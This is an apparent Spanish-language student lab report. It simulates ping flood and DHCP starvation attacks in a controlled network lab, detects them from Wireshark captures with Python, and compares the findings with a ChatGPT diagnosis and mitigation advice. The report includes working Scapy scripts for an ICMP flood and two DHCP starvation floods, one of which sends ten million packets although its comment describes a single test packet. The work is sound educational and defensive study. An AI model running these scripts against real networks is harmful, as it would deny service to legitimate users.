---
title: "Simulaci√≥n, Diagn√≥stico y Prevenci√≥n de Ataques"
author: 
    - Camila Guzm√°n
    - Dami√°n Luna
    - Juan Pablo de la Pe√±a
    - Gonzalo Higuera
    - Alfredo Lopez
format:
   html:
     toc: true
     html-math-method: katex
     embed-resources: true
     self-contained-math: true
     df-print: kable
     code-link: false
     code-copy: true
     code-tools: true
     listings: true
editor: visual
---

# Abstract

En el contexto de la ciberseguridad, los ataques de denegaci√≥n de servicio y la manipulaci√≥n de protocolos fundamentales han evolucionado desde simples experimentos acad√©micos en la d√©cada de 1980[^1] hasta convertirse en amenazas cr√≠ticas para infraestructuras modernas[^2]. Entre los ataques m√°s representativos se encuentran el Ping Flood, descrito desde los primeros usos de ICMP para diagn√≥stico[^3], y el DHCP Starvation, identificado formalmente a inicios de los a√±os 2000 como una vulnerabilidad inherente al dise√±o no autenticado del protocolo DHCP. Para comprender el funcionamiento y detecci√≥n de estos ataques se recrearon en un ambiente controlado dentro de un Laboratorio.

[^1]: Denial-of-Service attack. (s. f.). En *Devopedia*. Recuperado de https://devopedia.org/denial-of-service-attack

[^2]: The Evolution of DDoS Attacks: From 1994 SYN Floods to Today‚Äôs Cyber Battleground. (s. f.). *Qrator Labs Blog*. Recuperado de https://blog.qrator.net/en/the-evolution-of-ddos-attacks-a-journey-from-1994_192/

[^3]: Ping of death. (s. f.). En *Wikipedia*. Recuperado de https://en.wikipedia.org/wiki/Ping_of_death

Esta investigaci√≥n presenta el dise√±o, simulaci√≥n, diagn√≥stico y mitigaci√≥n de ataques de denegaci√≥n de servicio en un entorno controlado de laboratorio. Se implementaron dos vectores principales: ICMP Flood y DHCP Starvation utilizando herramientas como *Scapy*, *Wireshark* y equipos de red configurados manualmente. En la primera fase se construy√≥ la topolog√≠a de red y se analizaron sus limitaciones operativas; posteriormente, se ejecutaron los ataques y se captur√≥ el tr√°fico generado para su estudio.

En la tercera fase, la premisa consiste en detectar estos ataques mediante la ciencia de datos -asumiendo que se desconoce su realizaci√≥n-. Para ello, los datos del archivo *.pcapng* fueron transformados y analizados mediante Python, revelando picos an√≥malos de tr√°fico asociados a protocolos ICMP y DHCP[^4], y permitiendo identificar con precisi√≥n al origen y destino de los eventos [^5]. Finalmente, una inteligencia artificial (ChatGPT 5.1) fue utilizada para generar un diagn√≥stico independiente y recomendaciones de mitigaci√≥n; con el prop√≥sito de evidenciar los horizontes que expanden y limitan estas herramientas. Los resultados resaltan la efectividad de ambos ataques para degradar la disponibilidad del servicio y subrayan la necesidad de controles como DHCP Snooping, port security, limitaci√≥n de ICMP, IDS/IPS y monitoreo continuo para prevenir y contener incidentes similares en redes reales.

[^4]: Smurf attack. (s. f.). En *Wikipedia*. Recuperado de https://en.wikipedia.org/wiki/Smurf_attack

[^5]: Argyraki, K., & Cheriton, D. R. (2003). *Active Internet Traffic Filtering: Real-time Response to Denial of Service Attacks*. arXiv.

<p class="code-caption">

</p>

<p class="code-caption">

Repositorio del proyecto disponible en GitHub: [Repository](https://github.com/CamilaGUZM/Server-Attacks-simulation-and-diagnosis.git)

</p>

# Fase 1: Dise√±o del escenario y explicaci√≥n del ataque

## Simulaci√≥n Topol√≥gica

![Topology](../figures/topology.png)

![Configuration code](../figures/config_code.png)

En un caso real se espera que el analista no use la computadora de la v√≠ctima para realizar el an√°lisis en la red. Lo ideal es emplear un dispositivo externo conectado a un puerto configurado en modo *port mirroring* o a trav√©s de un equipo de monitoreo dedicado. Sin embargo, al terminar esta fase, se descubri√≥ que, dada la configuraci√≥n del switch en el laboratorio de pruebas, el an√°lisis solamente podr√° ser realizado desde el ordenador de la v√≠ctima -lo que implica que √∫nicamente se podr√° observar el tr√°fico que entra o sale de dicha m√°quina y no las interacciones entre los dem√°s equipos de la red-.

## Conceptos y Ataques a implementar

Antes de realizar la simulaci√≥n, es crucial la etapa de investigaci√≥n junto con familiarizaci√≥n con los t√©rminos y metodolog√≠as utilizadas durante la pr√°ctica.

### Conceptos

**ICMP:** Internet Control Message Protocol. Es un protocolo de la capa de red (dentro del conjunto de protocolos TCP/IP) que se utiliza principalmente para enviar mensajes de error y de diagn√≥stico en las comunicaciones de red. En el contexto de ataques, el ICMP es relevante porque existen ataques de denegaci√≥n de servicio (DoS) que lo explotan, como el ICMP Flood.

**DoS y DDoS:** Un DoS (Denial of Service) es un tipo de ataque en el que un ‚Äúactor‚Äù malicioso intenta deshabilitar una computadora o red interrumpiendo el funcionamiento normal del dispositivo al sobrecargarlo de tr√°fico. Un DDoS (Distributed Denial of Service) es casi lo mismo, solo que √©ste opera mediante m√∫ltiples sistemas inform√°ticos para generar su ataque.

**ARP:** Address Resolution Protocol; es un protocolo de red que se utiliza en redes IPv4 para enlazar una IP (l√≥gica) con una MAC (f√≠sica) dentro de una LAN.

**ARP Messages:** Paquetes que env√≠a el protocolo ARP dentro de la LAN para realizar la traducci√≥n IP ‚Üî MAC. Hay dos tipos principales:

1.  ARP Request.
2.  ARP Reply.

### Ataques

**ICMP Flood:** Tambi√©n conocido com inundaci√≥n de ping, es un ataque de Denegaci√≥n de Servicio (DoS) o Denegaci√≥n de Servicio Distribuida (DDoS) que aprovecha el ICMP, normalmente mediante paquetes de tipo ‚Äúecho request‚Äù (los usados en ping). Su funcionamiento puede resumirse en 4 pasos:

1.  El atacante env√≠a una gran cantidad de solicitudes ICMP (ping) a la v√≠ctima.
2.  Cada solicitud requiere ser procesada, ya que el paquete tiene que responder con un ‚Äúecho reply‚Äù.
3.  Si el volumen de solicitudes es demasiado alto, los recursos de la v√≠ctima (GPU, memoria, etc) se saturan.
4.  Finalmente, la m√°quina o red atacada se puede volver inaccesible.

**ARP Spoofing:** ARP Spoofing o ARP cache poisoning es un ataque de red en el cual un atacante env√≠a mensajes ARP falsos en una red local con el objetivo de asociar su MAC address con la IP address de otro dispositivo, para as√≠ poder recolectar el tr√°fico destinado a esta IP. Funciona de la siguiente manera:

1.  El atacante env√≠a respuestas ARP no solicitadas imitando ser otro nodo.
2.  Los dispositivos en la red actualizan sus cach√©s ARP con esta informaci√≥n.
3.  El atacante puede acceder al tr√°fico de √©sta IP que est√° ‚Äúimpersonando‚Äù.

**DHCP Starvation:** Este ataque es del tipo de negaci√≥n de servicio (DoS), su objetivo es dejar sin direcciones IP disponibles a un servidor DHCP. As√≠ funciona:

1.  El atacante env√≠a un paquete DHCP Discover como si fuera un cliente normal, pero lo hace con direcciones MAC falsas en cada petici√≥n.
2.  El servidor responde ofreciendo una direcci√≥n IP disponible en su *pool*.
3.  El atacante confirma y acepta de la IP ofrecida con un DHCP Request. C√≥mo usa una MAC diferente cada vez, el servidor piensa que es un dispositivo nuevo.
4.  El servidor registra esa IP como si fuera asignada a un cliente real. Se repiten los pasos anteriores cientos o miles de veces con MAC falsas cada vez.
5.  Como resultado si un cliente real quiere acceder a la red, se le niega porque ya no quedan direcciones IP disponibles y as√≠ niega el servicio completamente.

## Primer Acercamiento

Se realiz√≥ en un laboratorio la topolog√≠a mostrada. Se siguieron las siguientes l√≠neas de c√≥digo en la terminal de la consola ligada al router para la configuraci√≥n:

``` bash
enable
configure terminal
interface GigabitEthernet 0/0
ip address 10.0.0.1 255.255.255.0
no shutdown
exit
ip dhcp excluded-address 10.0.0.1 10.0.0.10
ip dhcp pool JUAN
 network 10.0.0.0 255.255.255.0
 default-router 10.0.0.1
```

Despu√©s de que se asignaron las IPs a las computadoras y se cre√≥ el grupo DHCP, se realizaron pings infinitos para documentarlos en la herramienta WireShark.

**(Ejemplo de comando en terminal Adjunto)**

``` bash
ping 10.0.0.4 -t
```

Lo que se observ√≥ en la plataforma al realizar los pings es que un ordenador no puede abrir paquetes con destinatarios ajenos. Se sospech√≥ que esto podr√≠a deberse a los permisos configurados en el Switch del Laboratorio.

### Caracter√≠sticas del Ambiente Construido

Con fines de replicabilidad, se nombran a continuaci√≥n las caracter√≠sticas de la pr√°ctica de laboratorio.

**Sistema Operativo** Windows.

**Herramientas necesarias**

-   Wireshark
-   hping3 o nping (Nmap) para ICMP Flood.
-   Ettercap, arpspoof (dsniff) o Bettercap para ARP Spoofing.
-   Yersinia o dhcpstarv para DHCP Starvation.

**Permisos requeridos**

-   Acceso de administrador de sistema.
-   Permisos para habilitar el modo promiscuo.
-   Permisos para ejecuci√≥n de herramientas de red.
-   Acceso a la red de prueba sin firewall activado.

------------------------------------------------------------------------

# Fase 2: Simulaci√≥n del ataque y captura del tr√°fico

## Introducci√≥n

El prop√≥sito de esta segunda pr√°ctica es lograr una implementaci√≥n de ataques virtuales mediante un entorno controlado: un laboratorio de redes. Los dos causantes de DoS seleccionados a implementar fueron el **DHCP Starvation**, el cual env√≠a numerosas solicitudes DHCP falsas con direcciones MAC distintas para agotar el rango de direcciones IP disponibles - impidiendo que dispositivos leg√≠timos obtengan configuraci√≥n de red- y **Ping Flood** , este env√≠a un gran volumen de paquetes ICMP Echo Request para saturar el ancho de banda o recursos del sistema objetivo. Como se mencion√≥ anteriormente, esto se realiz√≥ en un ambiente controlado y fue evidenciado mediante la herramienta WireShark manteniendo un registro del tr√°fico de paquetes; la simulaci√≥n tuvo una duraci√≥n total de 50 minutos.

## Creaci√≥n del Entorno de Trabajo

Primeramente, se cre√≥ la topolog√≠a de trabajo nuevamente, donde se incluy√≥ la consola al router con funci√≥n de la v√≠ctima, y una segunda computadora que funcion√≥ como atacante y analista. Se configur√≥ un grupo dhcp con el rango de IPs de 192.168.10.0 255.255.255.0 del cual se excluyeron las primeras 10. Luego, desde la computadora del atacante se abri√≥ WireShark y se realizaron pruebas de pings infinitos para asegurar comunicaci√≥n entre las computadoras.

## PING FLOOD

Para poder llevar a cabo este ataque, se cre√≥ un archivo python. Se hizo uso de la librer√≠a ***Scapy***, la cual simplific√≥ el flujo del c√≥digo. En la funci√≥n especificada para construir el ataque, se incluye la direcci√≥n IP v√≠ctima, el n√∫mero de paquetes a enviar y el tama√±o de cada paquete. Para implementar el c√≥digo, se direccion√≥ hacia la ip 192.168.10.21 (el router) con un total de 1,000 paquetes y un peso de 65,000 bytes (el m√°ximo dentro de paquetes ICMP).

``` python
from scapy.layers.inet import IP, ICMP
from scapy.packet import Raw
from scapy.sendrecv import send

def send_ping(target_ip_address: str, number_of_packets_to_send: int = 4, size_of_packet: int = 400):
    ip = IP(dst=target_ip_address)
    icmp = ICMP()
    raw = Raw(b"X" * size_of_packet)
    p = ip / icmp / raw
    send(p, count=number_of_packets_to_send, verbose=0)
    print('send_ping(): Sent ' + str(number_of_packets_to_send) + ' pings of ' + str(size_of_packet) + ' size to ' + target_ip_address)


ip = "192.168.10.11"
send_ping(ip, number_of_packets_to_send=10000)
```

<p class="code-caption">

C√≥digo utilizado para Ping Flood[^6]

[^6]: C√≥digo utilizado para Ping Flood

</p>

El script fue ejecutado desde la terminal del atacante. Con fines de ratificaci√≥n, se intent√≥ hacer ping desde la computadora del cliente al router, donde en ocasiones, el tiempo de respuesta disminu√≠a. En Wireshark esto se contempla como un conjunto masivo de observaciones donde se reporta el protocolo ICMP hacia 192.168.10.21 y sus Echos correspondientes.

![Evidence of Attack](../figures/ping_flood0.png)

![Evidence of Attack](../figures/ping_flood1.png)

## DHCP Starvation

En la segunda situaci√≥n, se utiliz√≥ igualmente *scapy*. En el c√≥digo se definieron funciones para crear las direcciones MAC falsas, para buscar una interfaz cuya IP empiece con el prefijo indicado y entregar el nombre de la interfaz junto buscar dicha interfaz. Finalmente, en la implementaci√≥n se hace uso de esta informaci√≥n para hacer una solicitud de asignaci√≥n de una IP junto con la cantidad de IPs a solicitar especificada por el usuario. Esta se ejecut√≥ desde la terminal del atacante siendo ‚ÄúEthernet‚Äù la interfaz identificada.

``` python
# dhcpStarvation_helper.py
from scapy.all import (
    Ether, IP, UDP, BOOTP, DHCP,
    RandMAC, sendp, get_if_list, get_if_addr
)
import sys

# Construye el DHCP Discover (ajusta si ya tienes otra versi√≥n)
dhcp_discover = Ether(dst='ff:ff:ff:ff:ff:ff', src=RandMAC()) / \
    IP(src='0.0.0.0', dst='192.168.10.255') / \
    UDP(sport=68, dport=67) / \
    BOOTP(op=1, chaddr=RandMAC()) / \
    DHCP(options=[('message-type','discover'), ('end')])

def find_iface_by_subnet(prefix="192.168.10."):
    """
    Busca una interfaz cuya IP empiece con prefix.
    Devuelve el nombre de la interfaz o None.
    """
    for iface in get_if_list():
        try:
            ip = get_if_addr(iface)
            if ip and ip.startswith(prefix):
                return iface
        except Exception:
            # algunas interfaces no tienen IP o generan excepci√≥n
            pass
    return None

def choose_interface(preferred_prefix="192.168.10."):
    # 1) si el usuario pasa el nombre por argumento de l√≠nea de comandos, usarlo
    if len(sys.argv) > 1:
        return sys.argv[1]

    # 2) buscar por prefijo de subred (√∫til en el aula)
    iface = find_iface_by_subnet(preferred_prefix)
    if iface:
        return iface

    # 3) heur√≠stica: elegir primera interfaz "Ethernet" o "Wi-Fi" si aparece
    ifaces = get_if_list()
    for name in ifaces:
        if "Ethernet" in name or "eth" in name.lower():
            return name
    for name in ifaces:
        if "Wi-Fi" in name or "wlan" in name.lower() or "wifi" in name.lower():
            return name

    # 4) fallback: la primera que no sea loopback
    for name in ifaces:
        if "loop" not in name.lower():
            return name

    # 5) si no hay nada, devolver None
    return None

def main():
    print("Interfaces detectadas por Scapy:", get_if_list())

    iface = choose_interface()
    if iface is None:
        print("ERROR: No se pudo detectar una interfaz v√°lida.")
        print("Prueba a ejecutar: python dhcpStarvation_helper.py \"Ethernet\"")
        return

    print("Interfaz elegida:", iface)
    print("Haciendo env√≠o de prueba (count=1). Si esto falla, revisa Npcap y permisos.")

    try:
        # prueba segura: solo un paquete
        sendp(dhcp_discover, iface=iface, count=10000000, verbose=1)
        print("Env√≠o realizado. Si ves tr√°fico en Wireshark/PCAP, ya funciona.")
    except Exception as e:
        print("Error al enviar paquetes con Scapy:")
        print(str(e))
        print("\nPosibles causas:")
        print("- No est√°s ejecutando como administrador.")
        print("- No tienes Npcap instalado (o no en modo 'WinPcap API-compatible').")
        print("- El adaptador f√≠sico est√° desconectado o en otra VLAN.")
        print("- El nombre de interfaz detectado no es correcto para tu sistema.")
        print("\nSoluci√≥n r√°pida: ejecuta el script desde PowerShell/CMD como administrador o")
        print("pasa el nombre de la interfaz manualmente: python dhcpStarvation_helper.py \"Ethernet\"")

if __name__ == "__main__":
    main()
```

<p class="code-caption">

C√≥digo utilizado para DHCP Starvation[^7]

[^7]: C√≥digo utilizado para DHCP Starvation

</p>

``` python
#!/usr/bin/env python3
#DHCP Starvation:
#Import Scapy
from scapy.all import *

#conf.checkIPaddr needs to be set to False. 
#When conf.checkIpaddr the reponse IP isn't checked
#against sending IP address. Don't need to match.   
conf.checkIPaddr = False

#Create DHCP discover with destination IP = broadadcast
#Source MAC address is a random MAC address
#Source IP address = 0.0.0.0
#Destination IP address = broadcast
#Source port = 68 (DHCP / BOOTP Client)
#Destination port = 67 (DHCP / BOOTP Server)
#DHCP message type is discover
dhcp_discover = Ether(dst='ff:ff:ff:ff:ff:ff',src=RandMAC())  \
                     /IP(src='0.0.0.0',dst='255.255.255.255') \
                     /UDP(sport=68,dport=67) \
                     /BOOTP(op=1,chaddr = RandMAC()) \
                     /DHCP(options=[('message-type','discover'),('end')])

#Send packet out of eth0 and loop the packet
sendp(dhcp_discover,iface='eth0',loop=1,verbose=1)

#Credits:
#https://scapy.readthedocs.io/_/downloads/en/latest/pdf/
#https://www.programcreek.com/
```

<p class="code-caption">

Segunda opci√≥n de C√≥digo utilizado para DHCP Starvation[^8]

[^8]: Segunda opci√≥n de c√≥digo utilizado para DHCP Starvation

</p>

En WireShark, esto es representado en m√∫ltiples solicitudes DHCP. Para verificar que fue exitoso el ataque, en la consola se buscaron los estad√≠sticos del servidor DHCP, donde se verific√≥ que 245 fueron asignados (recordemos que las primeras 10 direcciones fueron omitidas).

![Evidence of Attack](../figures/dhcp_starv0.png)

![Evidence of Attack](../figures/dhcp_starv1.png)

## Conclusiones

La pr√°ctica confirm√≥ que, en un entorno controlado, tanto el DHCP Starvation como el Ping Flood son capaces de degradar y/o interrumpir el servicio de red: el primero acapar√≥ las direcciones disponibles del servidor DHCP (245 leases asignados en la prueba) y el segundo cre√≥ congesti√≥n perceptible en la conectividad ICMP hacia el router. Las evidencias captadas con Wireshark reafirman la efectividad de los ataques implementados en Python usando Scapy y la importancia de la monitorizaci√≥n para detectar este tipo de anomal√≠as. Como lecciones pr√°cticas, estos ataques muestran la necesidad de controles de seguridad a nivel de capa 2/3 en redes LAN: habilitar DHCP Snooping, port security (limitaci√≥n de MACs por puerto), rate limiting de ICMP, reglas de ACL y sistemas de detecci√≥n de intrusos para mitigar y alertar sobre patrones an√≥malos.

------------------------------------------------------------------------

# Fase 3: An√°lisis de datos con Python

Ahora, el objetivo es poder identificar los ataques realizados desde el puesto de un analista de tr√°fico, el cual desconoce su realizaci√≥n. Para esto, se convirti√≥ el archivo *pcapng* de la ventana de tiempo de la simulaci√≥n a un csv y se abri√≥ con Python para poder analizar y hacer visualizaciones del comportamiento de paquetes junto con sus anomal√≠as detectadas.

## Resultados

Primeramente, se grafica el flujo de paquetes a trav√©s del tiempo. Se observa un incremento significante en referencia al tr√°fico no priorizado sobretodo en los primeros diez minutos y entre los minutos 37 y 42. Se indaga m√°s al filtrar los tipos de paquetes en el tiempo total de corrida.

![Time Series of Package traffic (All packets)](../figures/lineChartAllPackets.png)

Se descubre que hubo una proporci√≥n excesiva de paquetes ICMP y DHCP, la cual excede en millones al resto de protocolos. Esta evidencia levanta sospechas al ser comportamiento an√≥malo.

![Top IPs by Protocol](../figures/top_by_protocol.png)

Al sobreponer este filtro de paquetes sobre la linea de tiempo anterior, se comprueba que esos protocolos son el origen de los picos de tr√°fico. Ahora la pregunta en cuesti√≥n es qui√©nes son los culpables.

![Time Series of ICMP and DHCP Package traffic](../figures/lineChart.png)

En conjunto, analizamos las direcciones IP origen y destino ordenadas por frecuencia en la base de datos. El hallazgo es evidente: la direcci√≥n conflictiva corresponde a la 192.168.10.13 con direcci√≥n a la 192.168.10.1 (la cual corresponde al ruteador). Esto da indicadores de ataques con intenci√≥n de deshabilitar al ruteador.

![Top IPs by Destination](../figures/top_by_destination.png)

![Top IPs by Source](../figures/top_by_source.png)

Regresando a la serie de tiempo y teniendo en cuenta a los involucrados, se identifica una intenci√≥n de ataque, por lo que se desgloza el comportamiento.

La l√≠nea de tiempo muestra dos fases distintas de ataque: primero un ICMP Flood, con un alto volumen de paquetes en los primeros minutos, seguido por un DHCP Starvation, donde el tr√°fico DHCP aumenta significativamente hacia el final.

### **Explicaci√≥n de Evidencia y Comportamiento de los Ataques**

**ICMP Flood** El ataque ICMP Flood es m√°s r√°pido y visible, ya que satura el ancho de banda o la capacidad de respuesta del servidor mediante miles de solicitudes ping. Es eficiente a corto plazo, pero f√°cil de detectar y mitigar (por firewalls o limitaci√≥n de ICMP).

**DHCP Starvation** El DHCP Starvation, en cambio, no genera tanto tr√°fico, pero bloquea la asignaci√≥n de IPs v√°lidas a los clientes leg√≠timos. Es m√°s silencioso y persistente, por lo que puede ser m√°s eficiente estrat√©gicamente, especialmente en redes locales (LAN).

![Time Series of ICMP and DHCP Package traffic](../figures/lineChart.png)

### Conclusi√≥n de Fase

Aunque ambos ataques logran afectar la disponibilidad de la red, el DHCP Starvation es m√°s eficiente a nivel estrat√©gico, ya que usa menos recursos para saturar el serivcio del router. En cambio, el ICMP Flood provoca un impacto inmediato con un pico m√°s alto, pero es m√°s f√°cil de detectar y bloquear.

#### Diagn√≥stico

Debido al an√°lisis frecuentista podemos aseverar que los dos ataques identificados fueron de DHCP starvation y ping flood, dado que sus respectivos protocolos tuvieron las mayores interacciones. A su vez, podemos identificar puntualmente al atacante y a la v√≠ctima por la frecuencia de destinatario y origen.

------------------------------------------------------------------------

# Fase 4: Diagn√≥stico con Inteligencia Artificial y mitigaci√≥n

El objetivo de esta actividad es consultar a alguna inteligencia artificial, en este caso Chat-GPT Pro 5.1, con los datos recolectados de la simulaci√≥n del ataque y captura de tr√°fico en un archivo *.pcapng*, elaborar un diagn√≥stico final y proponer soluciones o mitigaciones t√©cnicas frente a las anomal√≠as identificadas. Por cuestiones de limpieza, se incluir√°n s√≥lo las partes cruciales de la conversaci√≥n.

## Transcripci√≥n de la conversaci√≥n con Chat-GPT

`Prompt:` *Hola, chat. Eres un analista de tr√°fico de datos (ciberseguridad) y te lleg√≥ este archivo .pcapng. Tu objetivo es analizar y mencionar las anomal√≠as que puedas encontrar. Pesa m√°s de 700 megas el archivo, as√≠ que estar√° en ZIP.*

::: callout-note
`Chat-GPT:` Perfecto, ya lo estuve ‚Äúdestripando‚Äù üòä. Te resumo lo que encontr√© como si fuera un informe de analista de tr√°fico:

1.  **Panorama general del tr√°fico En el .pcapng hay:**

-   \~824,397 paquetes en total
-   \~822k IPv4, \~1.2k IPv6
-   \~1k no-IP

Proporci√≥n por protocolo de capa 3:

-   ICMP: \~62.5% (515k paquetes) ‚Üí much√≠simo
-   UDP: \~37.2% (306k paquetes)
-   TCP: casi inexistente: 270 paquetes (\~0.03%)

Top hosts internos: 192.168.10.13 ‚Äì host m√°s activo (principal origen) 192.168.10.1 ‚Äì muy probablemente el gateway/router 192.168.10.12 ‚Äì segundo host interno importante 192.168.10.11 ‚Äì aparece casi s√≥lo en TFTP Tambi√©n aparecen direcciones raras como 192.168.10.0 y destino 255.255.255.0 usadas como si fueran hosts. Destinos externos relevantes: 8.8.8.8 (Google DNS) 1.1.1.1 (Cloudflare DNS) 23.64.121.49 (IP de un servidor HTTP, muy probablemente Akamai / CDN)

2.  **Anomal√≠a #1 ‚Äì Tr√°fico ICMP** brutal entre pocos hosts Hay m√°s de 515,000 paquetes ICMP distribuidos en solo 4 flujos: 192.168.10.13 ‚Üî 192.168.10.1 192.168.10.13 ‚Üî 192.168.10.12 Tipos ICMP observados:

-   **Type 8, code 0** ‚Äì Echo Request (pings)
-   **Type 0, code 0**‚Äì Echo Reply
-   **Type 3, code 1** ‚Äì Destination Unreachable (host unreachable)
-   **Type 3, code 2** ‚Äì Destination Unreachable (protocol unreachable)

<mark>Lo raro: Para un entorno normal, no es nada com√∫n tener \>500k ICMP en una captura as√≠. Hay flujos ICMP muy sim√©tricos, con \>120k paquetes por flujo (parece ping flood o prueba de estr√©s). Presencia continua de Destination Unreachable indica que se est√° intentando llegar a algo que no responde o a un servicio cerrado. <strong> üëâ Interpretaci√≥n: </strong> Esto huele a ataque o prueba de ICMP flood / host discovery masivo entre 192.168.10.13, 192.168.10.1 y 192.168.10.12. No parece tr√°fico ‚Äúnormal de usuario‚Äù (tipo un par de pings).</mark>

3.  **Anomal√≠a #2 ‚Äì Tormenta de DHCP (UDP 67)** con direcciones ‚Äúraras‚Äù Puertos destino m√°s usados (UDP/TCP):

-   67/UDP (DHCP server): \~304,315 paquetes
-   53/UDP (DNS): 1,280
-   16990/UDP: 875
-   80/TCP: 150
-   69/UDP (TFTP): 22
-   137/UDP, 138/UDP
-   5355/UDP: unos cuantos (NetBIOS/LLMNR)

Al revisar UDP hacia/desde puerto 67: Tr√°fico repetido del tipo: 192.168.10.0:68 ‚Üí 192.168.10.255:67 Lo raro: Un cliente DHCP t√≠pico usa: 0.0.0.0:68 ‚Üí 255.255.255.255:67 Aqu√≠ se usa 192.168.10.0 como origen (que normalmente es la direcci√≥n de red, no un host) y 192.168.10.255 como broadcast. El volumen es enorme: m√°s de 300k paquetes DHCP.

<mark> <strong>üëâ Interpretaci√≥n:</strong> Esto es altamente sospechoso de DHCP starvation / DHCP flood o de una herramienta que genera tr√°fico DHCP malformado o spoofeado. El uso de 192.168.10.0 como host refuerza la idea de spoofing o de un escenario de laboratorio para ataques.</mark>

*\[...\]*

9.  **Resumen ejecutivo** *\[...\]* En este .pcapng se observan m√∫ltiples comportamientos an√≥malos altamente sugerentes de un escenario de laboratorio con ataques: ICMP flood / scanning masivo entre 192.168.10.13, 192.168.10.1 y 192.168.10.12 (m√°s de 500k paquetes ICMP). Tormenta DHCP con direcciones de origen/destino no est√°ndar (192.168.10.0 ‚Üí 192.168.10.255, \>300k paquetes), compatible con DHCP starvation o flood *\[...\]*.
:::

## Diagn√≥stico final

Con base en nuestra revisi√≥n del tr√°fico capturado y en la interpretaci√≥n de Chat-GPT, se identificaron los siguientes elementos: 1. ICMP Flood/Ping Flood: Chat-GPT fue capaz de reconocer m√°s de 515,000 paquetes ICMP entre pocos hosts. Su interpretaci√≥n hace hincapi√© en la existencia de un tr√°fico anormalmente elevado, y cito, ‚Äúorientado a saturar la red o realizar reconocimiento agresivo‚Äù.

2.  DHCP Starvation: En este caso, Chat-GPT encontr√≥ m√°s de 300,000 solicitudes DHCP con direcciones inv√°lidas (192.168.10.0, por ejemplo). La interpretaci√≥n se centra en el intento de consumir todas las direcciones del servidor DHCP para impedir que clientes leg√≠timos reciban red.

3.  Uso excesivo de un puerto UDP at√≠pico (67).

Tambi√©n, Chat-GPT hizo varios descubrimientos que nosotros no notamos (o no buscamos) cuando hicimos nuestro an√°lisis pero, por otra parte, sospecha de algunas anomal√≠as inexistentes. Adjuntamos la transcripci√≥n de Chat-GPT sobre sus descubrimientos adicionales.

::: callout-note
3.  **SYN Scan / SYN Flood:** Evidencia: 270 paquetes TCP con flag SYN, sin SYN-ACK ni ACK. Interpretaci√≥n: escaneo semiabierto o ataque de negaci√≥n de servicio.
4.  **Spoofing de direcciones IP:** Evidencia: direcciones imposibles usando cabeceras IP v√°lidas. Interpretaci√≥n: ocultamiento deliberado del origen del tr√°fico.
5.  **TFTP Broadcast An√≥malo:** Evidencia: host 192.168.10.11 enviando requests TFTP a broadcast. Interpretaci√≥n: b√∫squeda de servidores TFTP o inicios de transferencia no autorizada.
6.  **Canal UDP sospechoso (16990):** Evidencia: flujo intenso entre 192.168.10.12 y 192.168.10.13. Interpretaci√≥n: posible t√∫nel, canal C2, o aplicaci√≥n no autorizada.

**S√≠ntomas observados:**

-   Saturaci√≥n de tr√°fico ICMP
-   P√©rdida de disponibilidad en DHCP
-   Intentos de conexi√≥n TCP incompletos
-   Tr√°fico interno no autorizado *\[...\]*
-   Congesti√≥n generalizada por tr√°fico repetitivo
-   Impacto potencial
    -   Disponibilidad: Ca√≠da del servidor DHCP ‚Üí usuarios sin conectividad
    -   Saturaci√≥n de red por ICMP ‚Üí latencia elevada *\[...\]*
    -   Exploraci√≥n de puertos (SYN scan) Operaciones: Interrupci√≥n del trabajo de usuarios
    -   Inestabilidad en servicios cr√≠ticos
    -   Potencial escalaci√≥n a explotaci√≥n de vulnerabilidades
:::

## Propuesta de mitigaci√≥n

### Propuesta del equipo

Despu√©s de analizar el tr√°fico capturado, se recalca que la mayor parte del problema viene de una cantidad excesiva de paquetes ICMP, especialmente de pings (Echo Request). Esto puede saturar la red, causar lentitud y afectar a otros dispositivos. Por ello se propone las siguientes acciones para mitigar este tipo de ataque:

1.  Limitar la cantidad de pings permitidos por segundo. Configurar en el router o firewall un l√≠mite de cu√°ntas solicitudes ICMP puede recibir el equipo por segundo. Con esto, aunque un atacante mande miles de pings, el router simplemente los va a ignorar.
2.  Bloquear pings provenientes de direcciones sospechosas. En la captura vimos direcciones que no deber√≠an existir (como 192.168.10.0). Se pueden bloquear manualmente para evitar que env√≠en m√°s paquetes ICMP.
3.  Reducir el uso de ICMP dentro de la red. Si no es estrictamente necesario, se puede restringir el ping entre todos los equipos para reducir la superficie de ataque. Por ejemplo: permitir pings solo al gateway para diagn√≥stico y bloquear el resto.
4.  Monitorear el equipo que m√°s paquetes ICMP envi√≥. El host 192.168.10.13 fue el m√°s activo. Se recomienda revisarlo, porque puede estar infectado o mal configurado.
5.  Crear alertas si el volumen de ICMP sube m√°s de lo normal. Configurar herramientas de monitoreo b√°sico para que avise si se detecta de nuevo una cantidad alta de ICMP.

En resumen: Limitar ICMP, bloquear direcciones raras, monitorear el equipo m√°s activo y activar alertas para evitar que un ping flood o DHCP Starvation vuelva a saturar la red.

### Chat-GPT:

::: callout-note
1.  **Mitigaci√≥n contra ICMP Flood (Ping Flood)**

    1.  Implementar rate limiting en dispositivos perimetrales. Configurar l√≠mites para las solicitudes ICMP de tipo echo-request. Esto reduce la saturaci√≥n del plano de control. Ejemplo de regla para limitar a 10 paquetes por segundo:

    iptables -A INPUT -p icmp ‚Äìicmp-type echo-request -m limit ‚Äìlimit 10/second -j ACCEPT iptables -A INPUT -p icmp ‚Äìicmp-type echo-request -j DROP

    2.  Filtrado de direcciones malformadas Bloquear paquetes ICMP provenientes de direcciones que no deber√≠an usarse como origen, como 192.168.10.0 o 255.255.255.0. 1.3. Control Plane Policing (CoPP) Configurar pol√≠ticas en el router para limitar la cantidad de ICMP que llega al CPU.

2.  **Mitigaci√≥n contra DHCP Starvation / DHCP Flood**

    1.  Habilitar DHCP Snooping Evita que puertos no autorizados generen solicitudes DHCP masivas. Configuraci√≥n recomendada: ip dhcp snooping ip dhcp snooping vlan 10 interface GigabitEthernet0/1 ip dhcp snooping limit rate 10
    2.  Implementar Port Security Limitar la cantidad de direcciones MAC permitidas por puerto para impedir creaci√≥n de cientos de clientes falsos. switchport port-security switchport port-security maximum 2 switchport port-security violation restrict

3.  **Mitigaci√≥n contra SYN Scan y SYN Flood**

    1.  Activar SYN Cookies Esta funci√≥n impide que los recursos del servidor se agoten durante ataques de inundaci√≥n. sysctl -w net.ipv4.tcp_syncookies=1
    2.  Configurar rate limiting para paquetes SYN. Limita la cantidad de solicitudes de conexi√≥n TCP sin completar handshake. iptables -A INPUT -p tcp ‚Äìsyn -m limit ‚Äìlimit 5/sec -j ACCEPT iptables -A INPUT -p tcp ‚Äìsyn -j DROP

4.  **Mitigaci√≥n contra Spoofing de IP**

